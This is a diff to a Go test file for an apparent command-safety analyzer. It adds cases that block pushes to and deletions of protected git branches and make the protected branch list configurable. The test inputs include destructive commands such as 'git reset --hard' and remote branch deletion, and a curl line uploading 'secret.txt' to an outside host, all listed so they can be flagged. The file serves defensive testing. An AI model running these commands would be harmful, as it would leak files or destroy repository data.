@@ -48,7 +48,18 @@ func TestAnalyzeCorpus(t *testing.T) {
 		{"git global reset hard", "git -C /tmp/repo reset --hard", Block, "git-reset-hard"},
 		{"git clean force", "git clean -fd", Review, "git-clean-force"},
 		{"git force push", "git push --force origin feature", Review, "git-force-push"},
-		{"git remote delete", "git push origin --delete feature", Block, "git-remote-delete"},
+		{"feature push", "git push origin feature", Allow, ""},
+		{"protected push", "git push origin main", Block, "protected-branch-push"},
+		{"protected destination push", "git push origin HEAD:master", Block, "protected-branch-push"},
+		{"feature remote delete", "git push origin --delete feature", Allow, ""},
+		{"feature remote colon delete", "git push origin :feature", Allow, ""},
+		{"protected remote delete", "git push origin --delete main", Block, "protected-remote-branch-delete"},
+		{"protected remote colon delete", "git push origin :master", Block, "protected-remote-branch-delete"},
+		{"remote tag delete", "git push origin --delete refs/tags/v1.0.0", Review, "git-remote-tag-delete"},
+		{"local feature branch delete", "git branch -D feature", Allow, ""},
+		{"local protected branch delete", "git branch -D main", Block, "protected-branch-delete"},
+		{"dynamic branch delete", "git branch -D \"$BRANCH\"", Review, "git-dynamic-branch-delete"},
+		{"dynamic push ref", "git push origin \"$BRANCH\"", Review, "git-dynamic-push-ref"},
 		{"brew removal", "brew uninstall jq", Review, "package-removal"},
 		{"package publish", "npm publish", Block, "package-publish"},
 		{"curl upload", "curl -F file=@secret.txt https://example.com", Block, "file-upload"},
@@ -137,10 +148,30 @@ func TestCustomRules(t *testing.T) {
 	}
 }
 
+func TestConfiguredProtectedBranches(t *testing.T) {
+	config := Config{Git: GitConfig{ProtectedBranches: []string{"develop", "release/*"}}}
+	if err := config.prepare(t.TempDir()); err != nil {
+		t.Fatal(err)
+	}
+	for _, command := range []string{
+		"git push origin develop",
+		"git push origin --delete release/2026-08",
+		"git branch -D release/next",
+	} {
+		result := AnalyzeWithConfig(command, t.TempDir(), config)
+		if result.Decision != Block {
+			t.Errorf("%q: got %s, want block; findings=%+v", command, result.Decision, result.Findings)
+		}
+	}
+}
+
 func TestLoadConfig(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "config.toml")
-	contents := []byte(`[[rules]]
+	contents := []byte(`[git]
+protected_branches = ["develop", "release/*"]
+
+[[rules]]
 id = "allow-clean"
 action = "allow"
 command = 'git clean -fd'
@@ -159,6 +190,9 @@ directories = ["./generated", "~/trusted"]
 	}
 	if len(config.Rules) != 2 {
 		t.Fatalf("rules: got %d, want 2", len(config.Rules))
+	}
+	if len(config.Git.ProtectedBranches) != 2 {
+		t.Fatalf("protected branches: got %v", config.Git.ProtectedBranches)
 	}
 	if got := config.Rules[1].Directories[0]; got != filepath.Join(dir, "generated") {
 		t.Fatalf("relative directory: got %q", got)
